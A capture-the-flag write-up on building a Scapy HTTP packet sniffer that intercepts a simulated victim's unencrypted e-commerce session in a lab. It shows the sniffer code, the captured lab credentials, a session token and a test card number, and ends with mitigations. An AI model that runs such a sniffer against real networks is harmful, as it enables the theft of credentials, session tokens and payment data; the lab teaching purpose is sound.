# Writeup – HTTP Packet Sniffer Challenge

This challenge involved developing a **Python-based HTTP packet sniffer** using Scapy to capture and analyze network traffic in a man-in-the-middle scenario. The goal was to intercept Alice's HTTP communications and extract sensitive information from unencrypted web traffic.

---

## 🔍 Challenge Overview

The challenge required implementing a sophisticated packet sniffer to capture HTTP traffic between Alice (victim) and an e-commerce website. Using Scapy, I needed to filter HTTP packets, extract meaningful data, and structure the results in JSON format for analysis.

### 🎯 Key Requirements:
- Capture HTTP requests and responses using Scapy
- Filter packets to identify HTTP traffic specifically  
- Extract request details: method, host, path, query parameters, cookies, body
- Extract response details: status codes, cookies, response body
- Parse form data from POST requests and query strings from GET requests
- Output structured JSON data for analysis
- Operate within Docker container network environment

---

## 🛠️ My Implementation Approach

### 1. **Packet Filtering Strategy**
Implemented precise filtering to capture only HTTP traffic:
```python
def packet_filter(packet):
    return packet.haslayer('HTTPRequest') or packet.haslayer('HTTPResponse')
```

The filter ensures we only process packets containing HTTP request or response layers, avoiding unnecessary processing of other network traffic like DNS, ICMP, or other protocols.

### 2. **HTTP Request Processing**
For incoming HTTP requests, extracted comprehensive information:
```python
def packet_process(packet):
    if packet.haslayer('HTTPRequest'):
        request = packet['HTTPRequest']
        host = request.Host.decode() if request.Host else None
        path = request.Path.decode() if request.Path else None
        method = request.Method.decode() if request.Method else None
        query_args = parse_qs(urlparse(path).query)
        cookies = request.Cookie.decode() if request.Cookie else None
        body = packet['Raw'].load.decode() if packet.haslayer('Raw') else None
```

**Key Implementation Details:**
- **Host Extraction**: Decoded HTTP Host header to identify target server
- **Method Parsing**: Captured HTTP methods (GET, POST, PUT, etc.)
- **Path Analysis**: Extracted full request path including query parameters
- **Query String Parsing**: Used `urllib.parse` to properly parse query arguments
- **Cookie Handling**: Extracted and decoded cookie headers when present
- **Body Processing**: Captured raw payload data for POST requests

### 3. **HTTP Response Processing**
For HTTP responses, focused on server data and cookie management:
```python
elif packet.haslayer('HTTPResponse'):
    response = packet['HTTPResponse']
    status_code = response.Status_Code.decode() if response.Status_Code else None
    cookies = response.Set_Cookie.decode() if response.Set_Cookie else None
    body = packet['Raw'].load.decode() if packet.haslayer('Raw') else None
```

**Critical Features:**
- **Status Code Extraction**: Captured HTTP response codes (200, 404, etc.)
- **Set-Cookie Processing**: Intercepted session cookies and authentication tokens
- **Response Body Analysis**: Captured server responses containing sensitive data

### 4. **Data Structure and JSON Output**
Organized captured data into structured format for analysis:
```python
# Request structure
{
    "type": "request",
    "host": host,
    "method": method,
    "path": path,
    "query_args": query_args,
    "cookies": cookies,
    "body": body
}

# Response structure  
{
    "type": "response",
    "status_code": status_code,
    "cookies": cookies,
    "body": body
}
```

---

## 🎯 Traffic Analysis and Flag Discovery

### **Captured E-commerce Session**
The packet sniffer successfully intercepted Alice's complete e-commerce session:

#### 1. **Initial Page Load**
```json
{
    "type": "request",
    "host": "e-commerce.seclab.space",
    "method": "GET", 
    "path": "/home?lang=en",
    "query_args": {"lang": ["en"]}
}
```

#### 2. **Login Credential Interception** 🚨
Most critical capture - login credentials transmitted in plaintext:
```json
{
    "type": "request",
    "method": "POST",
    "path": "/login", 
    "body": "username=alice&password=4l1c3"
}
```

**Security Impact**: Alice's credentials `alice:4l1c3` were completely exposed due to HTTP transmission.

#### 3. **Session Token Capture**
Server response contained session management cookie:
```json
{
    "type": "response",
    "status_code": "200",
    "cookies": "session-id=eyJhbGciOiJIUzI1NiJ9.YWxpY2U.MHnFOEgp6Qm4GbdqyJfWeYdxnQqhZXw-kCEHw9AI--I"
}
```

#### 4. **Credit Card Information Exposure** 🚨
Payment details captured during purchase:
```json
{
    "type": "request",
    "method": "PUT",
    "path": "/buy?item=lamp&currency=CAD",
    "body": "cc=4111111111111111&exp=12%2F20&code=945"
}
```

#### 5. **Flag Discovery** 🎯
The challenge flag was revealed in the order confirmation:
```json
{
    "type": "response", 
    "cookies": "order-id=[REDACTED]",
    "body": "Congratulations your order #[REDACTED] has been recorded"
}
```

**Flag Found**: `[REDACTED]`

---

## 🔧 Technical Challenges and Solutions

### **Challenge 1: Scapy Layer Loading**
**Issue**: Needed to ensure proper HTTP layer support
**Solution**: 
```python
load_layer('http')
load_layer('tls') 
load_layer('dns')
```

### **Challenge 2: Byte Decoding**
**Issue**: Scapy returns byte strings that needed proper decoding
**Solution**: Consistent use of `.decode()` with null checks
```python
host = request.Host.decode() if request.Host else None
```

### **Challenge 3: Query Parameter Parsing**
**Issue**: Complex URL parsing for GET request parameters
**Solution**: Leveraged `urllib.parse` for robust parsing
```python
query_args = parse_qs(urlparse(path).query)
```

### **Challenge 4: Raw Data Handling**
**Issue**: POST body data embedded in Raw layer
**Solution**: Conditional raw layer processing
```python
body = packet['Raw'].load.decode() if packet.haslayer('Raw') else None
```

---

## 🛡️ Security Implications and Lessons

### **Critical Vulnerabilities Demonstrated:**

#### 1. **HTTP vs HTTPS**
- **Risk**: All data transmitted in plaintext over HTTP
- **Impact**: Complete exposure of credentials, payment info, session data
- **Mitigation**: Always use HTTPS for sensitive communications

#### 2. **Network Position Attacks**
- **Risk**: Man-in-the-middle positioning allows complete traffic interception
- **Impact**: Passive monitoring captures all unencrypted data
- **Mitigation**: End-to-end encryption, certificate pinning, network segmentation

#### 3. **Session Management Exposure**
- **Risk**: Session tokens transmitted without encryption
- **Impact**: Session hijacking and account takeover possibilities
- **Mitigation**: Secure cookie flags, HTTPS-only transmission

#### 4. **Payment Data Exposure**
- **Risk**: Credit card details sent over unencrypted channels
- **Impact**: Financial fraud and identity theft potential
- **Mitigation**: PCI DSS compliance, encrypted payment processing

---

## 📊 Results and Effectiveness

### **Successful Captures:**
- ✅ **Login credentials**: `alice:4l1c3`
- ✅ **Session tokens**: JWT-format session identifier
- ✅ **Payment information**: Credit card number, expiration, CVV
- ✅ **Order details**: Item purchases and order numbers
- ✅ **Challenge flag**: Order ID `[REDACTED]`

### **Technical Achievements:**
- ✅ **Packet filtering**: Accurately identified HTTP traffic
- ✅ **Data extraction**: Successfully parsed all HTTP components
- ✅ **JSON formatting**: Clean, structured output for analysis
- ✅ **Container networking**: Operated effectively in Docker environment
- ✅ **Command-line interface**: Flexible packet count and output options

---

## 🎓 Key Learning Outcomes

### **Network Security Knowledge:**
- Understanding HTTP protocol vulnerabilities and plaintext risks
- Man-in-the-middle attack techniques and positioning strategies
- Network packet analysis and traffic interception methods
- Real-world implications of unencrypted web communications

### **Technical Skills Developed:**
- **Scapy Mastery**: Advanced packet manipulation and filtering
- **Python Networking**: HTTP parsing, URL processing, JSON handling
- **Docker Networking**: Container communication and traffic analysis
- **Forensic Analysis**: Extracting meaningful data from network captures

### **Cybersecurity Awareness:**
- Critical importance of HTTPS for web security
- Network monitoring and detection strategies
- Data protection requirements and compliance considerations
- Defense-in-depth approaches to network security

---

## 🔄 Practical Applications

This challenge provides foundation knowledge for:
- **Network security monitoring** and intrusion detection systems
- **Digital forensics** and incident response investigations
- **Penetration testing** and vulnerability assessment
- **Security awareness training** and risk assessment
- **Protocol analysis** and network troubleshooting

The skills developed here are directly applicable to cybersecurity roles in network monitoring, threat hunting, and security analysis positions.